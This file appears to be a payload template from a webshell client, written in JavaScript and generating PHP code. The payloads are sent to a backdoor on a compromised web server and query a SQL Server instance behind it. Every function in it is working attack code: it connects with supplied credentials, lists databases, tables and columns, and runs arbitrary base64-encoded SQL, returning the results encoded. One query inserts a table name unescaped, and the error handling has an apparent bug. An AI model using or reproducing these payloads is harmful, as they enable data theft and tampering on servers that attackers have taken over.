/**
 * 数据库管理模板::sqlsrv
 * php >= 5.3 原生不支持 mssql, 可采用 sqlsrv 连接 sqlserver
 * i 数据分隔符号 => \t|\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $chs="utf-8";
      $T=@sqlsrv_connect($hst,array("UID"=> $usr,"PWD"=>$pwd,"Database"=>"master","CharacterSet"=>$chs));
      $q=@sqlsrv_query($T,"select [name] from master.dbo.sysdatabases order by 1",null);
      while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){
        echo(trim($rs[0]).chr(9));
      }
      @sqlsrv_free_stmt($q);
      @sqlsrv_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $chs="utf-8";
      $T=@sqlsrv_connect($hst,array("UID"=> $usr,"PWD"=>$pwd,"Database"=>$dbn,"CharacterSet"=>$chs));
      $q=@sqlsrv_query($T,"SELECT [name] FROM sysobjects WHERE xtype='U' ORDER BY 1",null);
      while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){
        echo(trim($rs[0]).chr(9));
      }
      @sqlsrv_free_stmt($q);
      @sqlsrv_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}'
  },
  // 显示表字段
  show_columns: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
      $chs='utf-8';
      $T=@sqlsrv_connect($hst,array("UID"=> $usr,"PWD"=>$pwd,"Database"=>$dbn,"CharacterSet"=>$chs));
      $q=@sqlsrv_query($T,"select b.name,c.name,c.length from sysobjects a,syscolumns b,systypes c where a.id=b.id and b.xtype=c.xtype and a.name='{$tab}'",null);
      while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){
        echo(trim($rs[0])." ({$rs[1]}({$rs[2]}))".chr(9));
      }
      @sqlsrv_free_stmt($q);
      @sqlsrv_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{table}'
  },
  // 执行SQL语句
  query: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $sql=base64_decode($_POST["${arg5}"]);
      $chs=strtolower($m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"]);
      $chs=($chs=='utf-8'||$chs=='char')?$chs:'utf-8';
      $T=@sqlsrv_connect($hst,array("UID"=> $usr,"PWD"=>$pwd,"Database"=>$dbn,"CharacterSet"=>$chs));
      $q=@sqlsrv_query($T,$sql,null);
      if($q!==false){
        $i=0;
        $fm=@sqlsrv_field_metadata($q);
        if(empty($fm)){
          $ar=@sqlsrv_rows_affected($q);
          echo("Affect Rows\t|\t\r\n".base64_encode($ar)."\t|\t\r\n");
        }else{
          foreach($fm as $rs){
            echo($rs['Name']."\t|\t");
            $i++;
          }
          echo("\r\n");
          while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){
            for($c=0;$c<$i;$c++){
              echo(base64_encode(trim($rs[$c])));
              echo("\t|\t");
            }
            echo("\r\n");
          }
        }
        @sqlsrv_free_stmt($q);
      }else{
        echo("Status\t|\t\r\n");
        if(($e = sqlsrv_errors()) != null){
          foreach($e as $v){
            echo(base64_encode($e['message'])."\t|\t\r\n");
          }
        }else{
          echo("RmFsc2U="."\t|\t\r\n");
        }
      }
      @sqlsrv_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{base64::sql}',
    [arg6]: '#{encode}'
  }
})